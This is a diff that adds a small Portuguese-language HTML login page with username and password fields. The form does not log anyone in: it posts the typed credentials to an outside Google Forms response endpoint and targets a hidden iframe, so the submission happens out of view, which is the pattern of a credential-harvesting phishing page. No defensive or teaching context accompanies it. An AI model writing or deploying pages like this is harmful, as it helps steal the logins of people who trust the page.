@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #0b6623;
+    font-family: Arial, sans-serif;
+}
+
+.box {
+    background: white;
+    padding: 30px;
+    border-radius: 10px;
+    width: 300px;
+    text-align: center;
+}
+
+.box input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 15px;
+}
+
+.box button {
+    width: 100%;
+    padding: 10px;
+    background: #1faa59;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<form
+  class="box"
+  action="https://docs.google.com/forms/d/e/1FAIpQLSeSeRnZOIDPGFqEu49Kr-R2iM9xtyCZlth3WFllY_h0sHHAlg/formResponse"
+  method="POST"
+  target="hidden_iframe"
+>
+    <h3>Login</h3>
+
+    <input
+      type="text"
+      name="entry.1803232493"
+      placeholder="Usuário"
+      required
+    >
+
+    <input
+      type="password"
+      name="entry.888810994"
+      placeholder="Senha"
+      required
+    >
+
+    <button type="submit">Entrar</button>
+</form>
+
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+</body>
+</html>
